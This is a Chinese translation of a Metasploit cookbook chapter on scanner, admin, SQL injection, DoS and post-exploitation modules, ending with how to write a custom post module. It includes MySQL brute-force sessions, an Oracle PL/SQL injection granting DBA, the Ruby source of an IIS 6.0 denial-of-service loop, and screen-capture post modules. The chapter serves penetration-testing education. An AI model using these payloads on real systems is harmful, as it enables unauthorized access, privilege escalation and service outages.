# 第七章：使用渗透测试模块

在本章中，我们将涵盖：

+   使用扫描器辅助模块

+   使用辅助管理员模块

+   SQL 注入和 DOS 攻击模块

+   后渗透模块

+   了解模块构建的基础知识

+   分析现有模块

+   构建您自己的后渗透模块

# 介绍

在我们讨论 Metasploit 框架基础知识的第一章中，我们提到它具有模块化架构。这意味着所有的利用、有效载荷、编码器等都以模块的形式存在。模块化架构使得扩展框架的功能变得更加容易。任何程序员都可以开发自己的模块，并将其轻松地移植到框架中。完整的渗透测试过程可以包括多个模块的操作。例如，我们从一个利用模块开始，然后使用有效载荷模块，一旦目标被攻破，我们可以使用多个后渗透模块。最后，我们还可以使用不同的模块连接到数据库并存储我们的发现和结果。尽管在使用 Metasploit 时很少谈到模块，但它们构成了框架的核心，因此有必要对其有深入的了解。

在本章中，我们将特别关注`pentest/exploits/framework3/modules`目录，其中包含一整套有用的模块，可以简化我们的渗透测试任务。模块的使用方式与我们迄今为止所做的非常相似，但功能上有一些差异。在本章的后面，我们还将分析一些现有的模块，并最终通过学习如何为 Metasploit 开发自己的模块来结束本章。让我们开始使用模块进行实验。

# 使用扫描器辅助模块

让我们开始使用扫描器模块进行实验。我们已经详细了解了使用 Nmap 进行扫描。在这个示例中，我们将分析一些随框架提供的现成扫描模块。尽管 Nmap 是一个强大的扫描工具，但仍然可能出现需要执行特定类型的扫描的情况，例如扫描 MySQL 数据库的存在。

Metasploit 为我们提供了一个完整的有用扫描器列表。让我们继续实际实施其中一些。

## 准备工作

要找到可用扫描器的列表，我们需要浏览到`/pentest/exploits/framework3/modules/auxiliary/scanner`。

您可以找到一组超过 35 个有用的扫描模块，可在各种渗透测试场景下使用。

## 如何做...

让我们从基本的 HTTP 扫描器开始。您会发现有许多不同的 HTTP 扫描选项可用。我们将在这里讨论其中一些。

考虑`dir_scanner`脚本。这将扫描单个主机或完整的网络范围，以寻找可以进一步探索以收集信息的有趣目录列表。

要开始使用辅助模块，我们需要在 msfconsole 中执行以下步骤：

```
msf > use auxiliary/scanner/http/dir_scanner
msf auxiliary(dir_scanner) > show options
Module options: 
```

`show options`命令将列出您可以与扫描器模块一起传递的所有可选参数。最重要的是`RHOSTS`参数，它将帮助我们定位网络中的单台计算机或一系列计算机。

## 它是如何工作的...

让我们讨论涉及一些额外输入的特定扫描器模块。`mysql_login`扫描器模块是一个暴力模块，它扫描目标上 MySQL 服务器的可用性，并尝试通过暴力攻击登录到数据库：

```
msf > use auxiliary/scanner/mysql/mysql_login
msf auxiliary(mysql_login) > show options
Module options (auxiliary/scanner/mysql/mysql_login):
Name Current Setting Required Description
---- --------------- -------- -----------
BLANK_PASSWORDS true yes Try blank pas..
BRUTEFORCE_SPEED 5 yes How fast to..
PASSWORD no A specific password
PASS_FILE no File containing..
RHOSTS yes The target address.
RPORT 3306 yes The target port..
STOP_ON_SUCCESS false yes Stop guessing...
THREADS 1 yes The number of..
USERNAME no A specific user..
USERPASS_FILE no File containing..
USER_FILE no File containing..
VERBOSE true yes Whether to print.. 
```

正如您所看到的，我们可以传递许多不同的参数给这个模块。我们充分利用模块的功能，我们成功进行渗透测试的机会就越大。我们可以提供一个完整的用户名和密码列表，模块可以使用并尝试在目标机器上使用。

让我们向模块提供这些信息：

```
msf auxiliary(mysql_login) > set USER_FILE /users.txt
USER_FILE => /users.txt
msf auxiliary(mysql_login) > set PASS_FILE /pass.txt
PASS_FILE => /pass.txt 
```

现在我们准备使用暴力破解。最后一步将是选择目标并提供运行命令以执行该模块：

```
msf auxiliary(mysql_login) > set RHOSTS 192.168.56.101
RHOSTS => 192.168.56.101
msf auxiliary(mysql_login) > run
[*] 192.168.56.101:3306 - Found remote MySQL version 5.0.51a
[*] 192.168.56.101:3306 Trying username:'administrator' with password:'' 
```

输出显示，该模块首先查找目标上是否存在 MySQL 服务器来启动进程。一旦找到，它就开始尝试使用外部文本文件中提供的用户名和密码组合。这也是当前情况下 Metasploit 最广泛使用的模块操作之一。已经开发了许多自动化暴力破解模块来破解弱密码。

## 还有更多...

让我们通过 Metasploit 快速简单地生成密码文件的方法。在暴力渗透测试期间，拥有一个体面的密码文件列表可能会有所帮助。

### 使用"Crunch"生成密码

对于任何暴力破解攻击，我们都必须拥有一个可观的密码文件列表，这些列表将在此类攻击中使用。密码列表可以从在线资源获取，或者渗透测试人员可以选择使用 John The Ripper 生成密码列表。或者，也可以使用 Backtrack 的"crunch"实用程序基于正在使用的字符生成此类列表。您可以在`/pentest/passwords/crunch`中找到"crunch"实用程序。如果在您的 Backtrack 版本中缺少它，则可以通过在终端窗口中传递以下命令来安装它：

```
root@bt: cd /pentest/passwords
root@bt:/pentest/passwords# apt-get install crunch 
```

crunch 的基本语法如下：

```
./ crunch <min-len> <max-len> [-f /path/to/charset.lst charset-name] [-o wordlist.txt]
[-t [FIXED]@@@@] [-s startblock] [-c number]

```

让我们了解一些 crunch 实用程序的有用参数的功能：

+   `min-len:` 起始的最小长度字符串

+   `max-len:` 结束的最大长度字符串

+   `charset:` 定义要使用的字符集

+   `-b:` 数量[类型：kb/mb/gb] - 它指定输出文件的大小

+   `-f </path/to/charset.lst> <charset-name>:` 允许我们从`charset.lst`中指定字符集

+   `-o <wordlist.txt>:` 定义要保存输出的文件

+   `-t <@*%^>:` 用于添加那些肯定会出现在密码中的文本

可以在以下网址找到有关 crunch 实用程序的完整文档：

[`sourceforge.net/projects/crunch-wordlist/files/crunch-wordlist/`](http://sourceforge.net/projects/crunch-wordlist/files/crunch-wordlist/)

您可以阅读完整的文档，以找出如何使用此实用程序生成长且复杂的密码列表。

# 使用辅助管理模块

继续进行我们的模块实验，我们将了解一些在渗透测试期间非常有用的管理模块。管理模块可以用于不同的目的，例如可以查找管理面板，或者可以尝试进行管理登录等。这取决于模块的功能。在这里，我们将看一下一个名为`mysql_enum`模块的简单管理辅助模块。

## 准备工作

`mysql_enum`模块是 MySQL 数据库服务器的特殊实用程序模块。只要提供了适当的凭据以远程连接，该模块就可以对 MySQL 数据库服务器进行简单枚举。让我们通过使用该模块详细了解它。

## 如何做...

我们将从启动 msfconsole 并提供辅助模块的路径开始：

```
msf > use auxiliary/admin/mysql/mysql_enum
msf auxiliary(mysql_enum) > show options
Module options (auxiliary/admin/mysql/mysql_enum):
Name Current Setting Required Description
---- --------------- -------- -----------
PASSWORD no The password for the..
RHOST yes The target address
RPORT 3306 yes The target port
USERNAME no The username to.. 
```

如您所见，该模块接受密码、用户名和 RHOST 作为参数。这可以帮助模块首先搜索 MySQL 数据库的存在，然后应用凭据尝试远程登录。让我们分析`exploit`命令的输出：

```
msf auxiliary(mysql_enum) > exploit
[*] Configuration Parameters: 
[*] C2 Audit Mode is Not Enabled 
[*] xp_cmdshell is Enabled 
[*] remote access is Enabled 
[*] allow updates is Not Enabled 
[*] Database Mail XPs is Not Enabled 
[*] Ole Automation Procedures are Not Enabled 
[*] Databases on the server: 
[*] Database name:master 
```

该模块返回了大量有用的信息。它告诉我们在目标 MySQL 设置上已启用了`cmdshell`和远程访问。它还返回了目标机器上当前正在处理的数据库名称。

对于其他服务（如 MSSQL 和 Apache），也有几个类似的模块可用。大多数模块的工作过程都是类似的。请记住使用 show options 命令，以确保您传递了模块所需的参数。

## 它是如何工作的...

这些辅助管理模块通过简单的枚举过程运行，通过建立连接然后传递用户名和密码组合。它还可以用于检查数据库服务器是否支持匿名登录。我们还可以测试默认用户名和密码，就像 MySQL 使用“scott”和“tiger”作为默认登录凭据一样。

# SQL 注入和 DOS 攻击模块

Metasploit 对渗透测试人员和黑客都很友好。原因是渗透测试人员必须从黑客的角度思考，以确保他们的网络、服务、应用程序等安全。SQL 注入和 DOS 模块帮助渗透测试人员攻击自己的服务，以确定它们是否容易受到此类攻击。因此，让我们详细讨论一些这些模块。

## 准备工作

SQL 注入模块利用数据库类型中已知的漏洞并提供未经授权的访问。这个漏洞已知会影响 Oracle 9i 和 10g。Metasploit 包含几个模块，这些模块利用 Oracle 数据库中已知的漏洞来进行查询注入。这些模块可以在`modules/auxiliary/sqli/oracle`中找到。

## 如何操作...

让我们分析一个名为**Oracle DBMS_METADATA XML**的 Oracle 漏洞。这个漏洞将把权限从`DB_USER`提升到`DB_ADMINISTRATOR`（数据库管理员）。我们将使用`dbms_metadata_get_xml`模块：

```
msf auxiliary(dbms_metadata_get_xml) > show options
Module options (auxiliary/sqli/oracle/dbms_metadata_get_xml):
Name Current Setting Required Description
---- --------------- -------- -----------
DBPASS TIGER yes The password to..
DBUSER SCOTT yes The username to..
RHOST yes The Oracle host.
RPORT 1521 yes The TNS port.
SID ORCL yes The sid to authenticate.
SQL GRANT DBA to SCOTT no SQL to execute. 
```

该模块请求类似我们迄今为止见过的参数。数据库首先通过使用默认登录凭据，即“scott”和“tiger”作为默认用户名和密码来检查登录。一旦模块以数据库用户身份登录，它就会执行利用程序以提升权限到数据库管理员。让我们在目标上执行模块作为测试运行。

```
msf auxiliary(dbms_metadata_get_xml) > set RHOST 192.168.56.1
msf auxiliary(dbms_metadata_get_xml) > set SQL YES
msf auxiliary(dbms_metadata_get_xml) > run 
```

模块成功执行后，用户权限将从`DB_USER`提升到`DB_ADMINISTRATOR`。

我们将要介绍的下一个模块与**拒绝服务（DOS）**攻击有关。我们将分析一个简单的 IIS 6.0 漏洞，允许攻击者通过发送包含超过 40000 个请求参数的 POST 请求来使服务器崩溃。我们将很快分析这个漏洞。该模块已在运行 IIS 6.0 的未打补丁的 Windows 2003 服务器上进行了测试。我们将使用的模块是`ms10_065_ii6_asp_dos:`

```
msf > use auxiliary/dos/windows/http/ms10_065_ii6_asp_dos
msf auxiliary(ms10_065_ii6_asp_dos) > show options
Module options (auxiliary/dos/windows/http/ms10_065_ii6_asp_dos):
Name Current Setting Required Description
---- --------------- -------- -----------
RHOST yes The target address
RPORT 80 yes The target port
URI /page.asp yes URI to request
VHOST no The virtual host name to..
msf auxiliary(ms10_065_ii6_asp_dos) > set RHOST 192.168.56.1
RHOST => 192.168.56.1
msf auxiliary(ms10_065_ii6_asp_dos) > run
[*] Attacking http://192.168.56.1:80/page.asp 
```

一旦使用 run 命令执行模块，它将通过在端口 80 上发送 HTTP 请求，以 URI 为 page.asp 来攻击目标 IIS 服务器。模块的成功执行将导致 IIS 服务器完全拒绝服务。

## 它是如何工作的...

让我们快速看一下这两个漏洞。通过注入一个自定义的 PL/SQL 函数来利用 Oracle 数据库漏洞，该函数在 SYS 上下文中执行，并将用户“scott”的权限提升为管理员。

考虑以下示例函数：

```
CREATE OR REPLACE FUNCTION "SCOTT"."ATTACK_FUNC" return varchar2 authid current_user as pragma autonomous_transaction; BEGIN EXECUTE IMMEDIATE 'GRANT DBA TO SCOTT'; COMMIT; RETURN ''; END; /

```

现在将此函数注入到易受攻击的过程中将导致用户 scott 的权限提升。

```
SELECT SYS.DBMS_METADATA.GET_DDL('''||SCOTT.ATTACK_FUNC()||''','') FROM dual;

```

上述代码行解释了注入过程。对 Oracle 软件中漏洞的详细分析超出了本书的范围。

现在移动 DOS 攻击模块，它利用 IIS 6.0 服务器中的漏洞。攻击者发送一个包含超过 40000 个请求参数的 POST 请求，并以`application/x-www-form-urlencoded`编码类型发送。

以下是服务模块的一部分脚本：

```
while(1)
begin
connect
payload = "C=A&" * 40000
length = payload.size
sploit = "HEAD #{datastore['URI']} HTTP/1.1\r\n"
sploit << "Host: #{datastore['VHOST'] || rhost}\r\n"
sploit << "Connection:Close\r\n"
sploit << "Content-Type: application/x-www-form-urlencoded\r\n"
sploit << "Content-Length:#{length} \r\n\r\n"
sploit << payload
sock.put(sploit)
#print_status("DoS packet sent.")
disconnect
rescue Errno::ECONNRESET
next
end
end 
```

如您所见，脚本生成了超过 40000 的有效负载大小。然后，在端口 80 上建立连接，向 IIS 服务器发送 HTTP 请求。一旦服务器渲染了请求，它将崩溃并停止工作，除非重新启动。

# 后期利用模块

到目前为止，我们已经在后渗透阶段使用了 meterpreter 的各种功能。然而，我们还有一个单独的专用模块列表，可以增强我们的渗透测试体验。由于它们是后渗透模块，我们将需要与目标建立一个活动会话。我们可以使用前几章描述的任何方法来访问我们的目标。

## 准备工作

后模块是一组最有趣和方便的功能的集合，您可以在渗透测试中使用。让我们快速分析其中一些。在这里，我们使用一个未打补丁的 Windows 7 机器作为我们的目标，并且有一个活动的 meterpreter 会话。

## 如何做...

您可以在`modules/post/windows/gather`中找到后模块。让我们从一个简单的`enum_logged_on_users`模块开始。这个后模块将列出 Windows 机器中当前登录的用户。

我们将通过我们的活动 meterpreter 会话执行模块。还要记住使用`getsystem`命令提升权限，以避免在执行模块时出现任何错误。

```
meterpreter > getsystem
...got system (via technique 4).
meterpreter > run post/windows/gather/enum_logged_on_users
[*] Running against session 1
Current Logged Users
====================
SID User
--- ----
S-1-5-21-2350281388-457184790-407941598 DARKLORD-PC\DARKLORD
Recently Logged Users
=====================
SID Profile Path
--- ------------
S-1-5-18 %systemroot%\system32\config\systemprofile
S-1-5-19 C:\Windows\ServiceProfiles\LocalService
S-1-5-20 C:\Windows\ServiceProfiles\NetworkService
S-1-5-21-23502 C:\Users\DARKLORD
S-1-5-21-235 C:\Users\Winuser 
```

模块的成功执行向我们展示了两个表。第一个表反映了当前登录的用户，第二个表反映了最近登录的用户。在执行模块时，请遵循正确的路径。我们使用`run`命令来执行模块，因为它们都是以 Ruby 脚本的形式存在，所以 meterpreter 可以轻松识别它。

让我们再举一个例子。有一个有趣的后模块可以捕获目标桌面的截图。当我们需要知道是否有任何活动用户时，这个模块就会很有用。我们将使用的模块是`screen_spy.rb:`

```
meterpreter > run post/windows/gather/screen_spy
[*] Migrating to explorer.exe pid: 1104
[*] Migration successful
[*] Capturing 60 screenshots with a delay of 5 seconds 
```

您可能已经注意到后模块可以是多么简单和有用。在未来，Metasploit 的开发人员将更多地专注于后模块，而不是 meterpreter，因为它极大地增强了渗透测试的功能。因此，如果您希望为 Metasploit 社区做出贡献，那么您可以致力于后模块。

## 工作原理...

我们可以在`modules/post/windows/gather`中分析`enum_logged_on_user.rb`和`screen_spy.rb`的脚本。这可以帮助我们了解这些模块的功能。

# 理解模块构建的基础知识

到目前为止，我们已经看到了模块的效用以及它们可以为框架增加的功能。为了掌握框架，了解模块的工作和构建是至关重要的。这将帮助我们根据我们的需求快速扩展框架。在接下来的几个示例中，我们将看到如何使用 Ruby 脚本构建我们自己的模块并将其导入框架。

## 准备工作

要开始构建我们自己的模块，我们需要基本的 Ruby 脚本知识。我们已经讨论了在 meterpreter 脚本中使用和实现 Ruby。在这个示例中，我们将看到如何使用 Ruby 来开始为框架构建模块。这个过程与 meterpreter 脚本非常相似。不同之处在于使用一组预定义的行，这些行将需要以使框架了解模块的要求和性质。因此，让我们讨论一些模块构建的基本要求。

## 如何做...

框架中的每个模块都以 Ruby 脚本的形式存在，并位于模块目录中。根据我们的需求，我们将不得不导入一些框架库。让我们继续前进，看看我们如何在脚本中导入库并设计一个完全功能的模块。

## 工作原理...

让我们从模块构建的一些基础知识开始。为了使我们的模块对框架可读，我们将不得不导入 MSF 库：

```
require 'msf/core'

```

这是每个脚本的首要行。这一行表示该模块将包括 Metasploit 框架的所有依赖项和功能。

```
class Metasploit3 < Msf::Auxiliary

```

这行定义了一个类，该类继承了辅助家族的属性。辅助模块可以导入多种功能，如扫描、建立连接、使用数据库等：

```
include Msf::

```

`include`语句可用于将框架的特定功能包含到我们自己的模块中。例如，如果我们正在构建一个扫描器模块，那么我们可以将其包含为：

```
include Msf::Exploit::Remote::TCP

```

这行将在模块中包含远程 TCP 扫描的功能。这行将从 Metasploit 库中提取主要扫描模块库：

```
def initialize
super(
'Name' => 'TCP Port Scanner',
'Version' => '$Revision$',
'Description' => 'Enumerate open TCP services',
'Author' => [ darklord ],
'License' => MSF_LICENSE
)

```

脚本的下几行向我们介绍了模块的名称、版本、作者、描述等：

```
register_options(
[
OptString.new('PORTS', [true, "Ports to scan (e.g. 25,80,110-900)", "1-10000"]),
OptInt.new('TIMEOUT', [true, "The socket connect timeout in milliseconds", 1000]),
OptInt.new('CONCURRENCY', [true, "The number of concurrent ports to check per host", 10]), self.class)
deregister_options('RPORT')

```

脚本的下几行用于初始化脚本的值。标记为`true`的选项是模块基本所需的选项，而标记为`no`的选项是可选的。这些值可以在执行模块时传递/更改。

这些是您在每个模块中都会找到的一些常见脚本行。分析内置脚本是了解脚本构建的最佳方法。有一些文档可供学习模块构建。学习的最佳方法是掌握 Ruby 脚本编写，并分析现有模块。在下一个示例中，我们将从头开始分析一个完整的模块。

# 分析现有模块

现在我们已经在上一个示例中建立了一些关于模块构建的背景，我们的下一步将是分析现有模块。强烈建议您查看现有模块的脚本，以便更深入地了解模块和平台开发。

## 准备工作

我们将在这里分析一个简单的 ftp 模块，以便更深入地了解模块构建。

我们将从上一个示例中离开的地方继续。我们已经在上一个示例中讨论了模块的基本模板，所以在这里我们将从脚本的主体开始。

## 如何做...

我们将分析 ftp 匿名访问模块。您可以在以下位置找到主要脚本：`pentest/exploits/framework3/modules/auxiliary/scanner/ftp/anonymous.rb`

这是您参考的完整脚本：

```
class Metasploit3 < Msf::Auxiliary
include Msf::Exploit::Remote::Ftp
include Msf::Auxiliary::Scanner
include Msf::Auxiliary::Report
def initialize
super(
'Name' => 'Anonymous FTP Access Detection',
'Version' => '$Revision: 14774 $',
'Description' => 'Detect anonymous (read/write) FTP server access.',
'References' =>
[
['URL', 'http://en.wikipedia.org/wiki/File_Transfer_Protocol#Anonymous_FTP'],
],
'Author' => 'Matteo Cantoni <goony[at]nothink.org>',
'License' => MSF_LICENSE
)
register_options(
[
Opt::RPORT(21),
], self.class)
end
def run_host(target_host)
begin
res = connect_login(true, false)
banner.strip! if banner
dir = Rex::Text.rand_text_alpha(8)
if res
write_check = send_cmd( ['MKD', dir] , true)
if (write_check and write_check =~ /²/)
send_cmd( ['RMD', dir] , true)
print_status("#{target_host}:#{rport} Anonymous READ/WRITE (#{banner})")
access_type = "rw"
else
print_status("#{target_host}:#{rport} Anonymous READ (#{banner})")
access_type = "ro"
end
report_auth_info(
:host => target_host,
:port => rport,
:sname => 'ftp',
:user => datastore['FTPUSER'],
:pass => datastore['FTPPASS'],
:type => "password_#{access_type}",
:active => true
)
end
disconnect
rescue ::Interrupt
raise $!
rescue ::Rex::ConnectionError, ::IOError
end
end
end

```

让我们转到下一节，详细分析脚本。

## 工作原理...

让我们从分析主要脚本主体开始，以了解其工作原理：

```
def run_host(target_host)
begin
res = connect_login(true, false)
banner.strip! if banner
dir = Rex::Text.rand_text_alpha(8)

```

此函数用于开始连接。res 变量保存布尔值 true 或 false。`connect_login`函数是模块用于与远程主机建立连接的特定函数。根据连接的成功或失败，布尔值存储在 res 中。

```
if res
write_check = send_cmd( ['MKD', dir] , true)
if (write_check and write_check =~ /²/)
send_cmd( ['RMD', dir] , true)
print_status("#{target_host}:#{rport} Anonymous READ/WRITE (#{banner})")
access_type = "rw"
else
print_status("#{target_host}:#{rport} Anonymous
access_type="ro"

```

一旦连接建立，模块会尝试检查匿名用户是否具有读/写权限。`write_check`变量检查写操作是否可能。然后检查操作是否成功。根据权限的状态，在屏幕上打印消息。如果写操作失败，则状态将打印为`ro`或`read-only:`

```
report_auth_info(
:host => target_host,
:port => rport,
:sname => 'ftp',
:user => datastore['FTPUSER'],
:pass => datastore['FTPPASS'],
:type => "password_#{access_type}",
:active => true
)
end

```

下一个函数用于报告授权信息。它反映了重要的参数，如主机、端口、用户、密码等。这些是我们使用`show options`命令时出现的值，因此这些值是用户相关的。

这是一个简单演示，演示了一个简单模块在框架内的功能。您可以相应地更改现有脚本以满足您的需求。这使得平台非常适合开发。正如我所说，了解更多关于模块构建的最佳方法是通过分析现有脚本。

在下一个示例中，我们将看到如何构建我们自己的模块并将其传递到框架中。

# 构建您自己的后渗透模块

现在我们已经涵盖了足够的关于构建模块的背景知识。在这里，我们将看到一个示例，说明我们如何构建自己的模块并将其添加到框架中。构建模块非常方便，因为它们将使我们有能力根据我们的需求扩展框架。

## 如何做...

让我们构建一个小的后渗透模块，该模块将枚举目标计算机上安装的所有应用程序。由于这是一个后渗透模块，我们需要一个受损的目标才能执行该模块。

要开始构建模块，我们将首先导入框架库并包含所需的依赖项：

```
require 'msf/core'
require 'rex'
require 'msf/core/post/windows/registry'
class Metasploit3 < Msf::Post
include Msf::Post::Windows::Registry
def initialize(info={})
super( update_info( info,
'Name' => 'Windows Gather Installed Application Enumeration',
'Description' => %q{ This module will enumerate all installed applications },
'License' => MSF_LICENSE,
'Platform' => [ 'windows' ],
'SessionTypes' => [ 'meterpreter' ]
))
end 
```

脚本以包含 Metasploit 核心库开始。然后，我们建立了一个扩展 Msf::Post 模块属性的类。

接下来，我们创建`initialize`函数，该函数用于初始化和定义模块属性和描述。这种基本结构在几乎所有模块中都是相同的。这里需要注意的是，我们已经包含了'rex'和'registry'库。这将使框架更容易理解我们在模块中的需求。

现在，我们的下一步将是创建一个可以显示我们提取结果的表格。我们有一个特殊的库`Rex::Ui::Text`，可以用于此任务。我们将不得不定义不同的列：

```
def app_list
tbl = Rex::Ui::Text::Table.new(
'Header' => "Installed Applications",
'Indent' => 1,
'Columns' =>
[
"Name",
"Version"
])
appkeys = [
'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall',
'HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall',
'HKLM\\SOFTWARE\\WOW6432NODE\\Microsoft\\Windows\\CurrentVersion\\Uninstall',
'HKCU\\SOFTWARE\\WOW6432NODE\\Microsoft\\Windows\\CurrentVersion\\Uninstall',
]
apps = []
appkeys.each do |keyx86|
found_keys = registry_enumkeys(keyx86)
if found_keys
found_keys.each do |ak|
apps << keyx86 +"\\" + ak
end
end
end 
```

脚本主体以构建表格并提供不同的列名开始。然后，创建一个单独的注册表位置数组，该数组将用于枚举应用程序列表。该数组将包含包含有关目标计算机上安装的应用程序的信息的不同注册表条目。应用程序信息维护在一个名为`apps`的单独数组中。

然后，我们通过运行一个循环来开始枚举过程，该循环查看存储在`appskey`数组中的不同注册表位置：

```
t = []
while(not apps.empty?)
1.upto(16) do
t << framework.threads.spawn("Module(#{self.refname})", false, apps.shift) do |k|
begin
dispnm = registry_getvaldata("#{k}","DisplayName")
dispversion = registry_getvaldata("#{k}","DisplayVersion")
tbl << [dispnm,dispversion] if dispnm and dispversion
rescue
end
end

```

脚本的下一行用不同的值填充表格的相应列。脚本使用内置函数`registry_getvaldata`，该函数获取值并将其添加到表中：

```
results = tbl.to_s
print_line("\n" + results + "\n")
p = store_loot("host.applications", "text/plain", session, results, "applications.txt", "Installed Applications")
print_status("Results stored in: #{p}")
end
def run
print_status("Enumerating applications installed on #{sysinfo['Computer']}")
app_list
end
end

```

脚本的最后几行用于将信息存储在名为`applications.txt`的单独文本文件中。脚本使用`store_loot`函数将完整的表格存储在文本文件中。

最后，在屏幕上显示输出，指出文件已创建，并将结果存储在其中。

下一步将是将完整的程序存储在相应的目录中。您必须确保选择正确的目录来存储您的模块。这将有助于框架清楚地理解模块的实用性，并将维护一个层次结构。在更新模块时保持层次结构将有助于准确跟踪模块的目标。例如，将 Internet Explorer 模块保留在`modules/exploits/windows/browser`目录下，将有助于我们轻松地在此位置找到任何新的或现有的浏览器模块。

要确定模块存储位置，您应该查看以下要点：

+   模块类型

+   模块执行的操作

+   受影响的软件或操作系统

Metasploit 遵循存储模块的“通用到专用”的层次结构格式。它从模块类型开始，例如利用模块或辅助模块。然后选择一个通用名称，例如受影响的操作系统的名称。然后创建更专业的功能，例如模块用于浏览器。最后，使用最具体的命名，例如模块针对的浏览器的名称。

让我们考虑我们的模块。这个模块是一个后渗透模块，用于枚举 Windows 操作系统并收集有关系统的信息。因此，我们的模块应该遵循存储的约定。

因此，我们的目标文件夹应该是`modules/post/windows/gather/`。

你可以用你想要的名称和.a.rb 扩展名保存模块。让我们把它保存为`enum_applications.rb`。

## 它的工作原理是...

一旦我们把模块保存在它的首选目录中，下一步就是执行它，看看它是否正常工作。我们已经在之前的示例中看到了模块执行的过程。模块名称用于在 MSF 终端中执行它：

```
msf> use post/windows/gather/enum_applications
msf post(enum_applications) > show options
Module options (post/windows/gather/enum_applcations)
Name Current Setting Required Description
SESSION yes The session.. 
```

这是一个小例子，说明了如何构建和添加自己的模块到框架中。如果你想构建好的模块，你肯定需要对 Ruby 脚本有扎实的知识。你也可以通过发布你的模块来为 Metasploit 社区做出贡献，并让其他人受益。
